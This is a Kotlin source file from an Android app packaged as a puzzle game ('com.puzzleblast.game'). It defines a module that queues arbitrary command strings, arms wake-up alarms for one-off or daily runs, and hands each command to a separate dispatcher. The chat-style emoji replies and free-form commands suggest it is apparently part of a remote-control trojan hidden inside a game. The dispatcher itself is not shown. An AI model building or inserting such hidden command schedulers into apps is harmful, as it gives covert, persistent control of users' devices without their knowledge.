package com.puzzleblast.game.modules

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.SystemClock
import com.puzzleblast.game.util.Prefs
import org.json.JSONArray
import org.json.JSONObject

object ScheduleModule {
    data class Task(val id: Int, val cmd: String, val fireAt: Long, val daily: Boolean = false, val hour: Int = 0, val minute: Int = 0)

    val tasks = mutableListOf<Task>()

    suspend fun schedule(ctx: Context, cmd: String, spec: String): String {
        val id = (tasks.maxOfOrNull { it.id } ?: 0) + 1
        val dailyMatch = Regex("""daily\s+(\d{1,2}):(\d{2})""").find(spec)
        if (dailyMatch != null) {
            val h = dailyMatch.groupValues[1].toInt(); val m = dailyMatch.groupValues[2].toInt()
            tasks.add(Task(id, cmd, 0, true, h, m))
            armDaily(ctx, id, h, m)
            return "⏰ #$id daily ${h}:${m.toString().padStart(2, '0')} — $cmd"
        }
        val delayMatch = Regex("""\+(\d+)([smhd])""").find(spec)
        if (delayMatch != null) {
            val n = delayMatch.groupValues[1].toLong()
            val mult = when (delayMatch.groupValues[2]) { "s" -> 1000L; "m" -> 60_000L; "h" -> 3_600_000L; else -> 86_400_000L }
            val fireAt = System.currentTimeMillis() + n * mult
            tasks.add(Task(id, cmd, fireAt))
            armOnce(ctx, id, fireAt)
            return "⏰ #$id in ${n}${delayMatch.groupValues[2]} — $cmd"
        }
        return "⏰ bad schedule spec. use +<N><s|m|h|d> or daily HH:MM"
    }

    suspend fun list(): String {
        if (tasks.isEmpty()) return "⏰ no pending tasks"
        return "⏰ pending · ${tasks.size}\n" + tasks.joinToString("\n") { t ->
            if (t.daily) "  #${t.id} daily ${t.hour}:${t.minute.toString().padStart(2, '0')} — ${t.cmd}"
            else "  #${t.id} at ${t.fireAt} — ${t.cmd}"
        }
    }

    suspend fun cancel(id: Int): String {
        val removed = tasks.removeAll { it.id == id }
        return if (removed) "❌ cancelled #$id" else "❌ task #$id not found"
    }

    suspend fun clear(): String {
        tasks.clear()
        return "🧹 schedule cleared"
    }

    private fun armOnce(ctx: Context, id: Int, fireAt: Long) {
        val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getBroadcast(ctx, id, Intent(ctx, ScheduledFire::class.java).putExtra("id", id), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, fireAt, pi)
    }

    private fun armDaily(ctx: Context, id: Int, hour: Int, minute: Int) {
        val cal = java.util.Calendar.getInstance().apply {
            set(java.util.Calendar.HOUR_OF_DAY, hour); set(java.util.Calendar.MINUTE, minute); set(java.util.Calendar.SECOND, 0)
            if (timeInMillis < System.currentTimeMillis()) add(java.util.Calendar.DAY_OF_MONTH, 1)
        }
        val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getBroadcast(ctx, id, Intent(ctx, ScheduledFire::class.java).putExtra("id", id), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        am.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.timeInMillis, AlarmManager.INTERVAL_DAY, pi)
    }
}

class ScheduledFire : android.content.BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        val id = intent?.getIntExtra("id", -1) ?: return
        val task = ScheduleModule.tasks.firstOrNull { it.id == id } ?: return
        if (!task.daily) ScheduleModule.tasks.remove(task)
        com.puzzleblast.game.core.Dispatcher.runScheduled(ctx, task.cmd)
    }
}
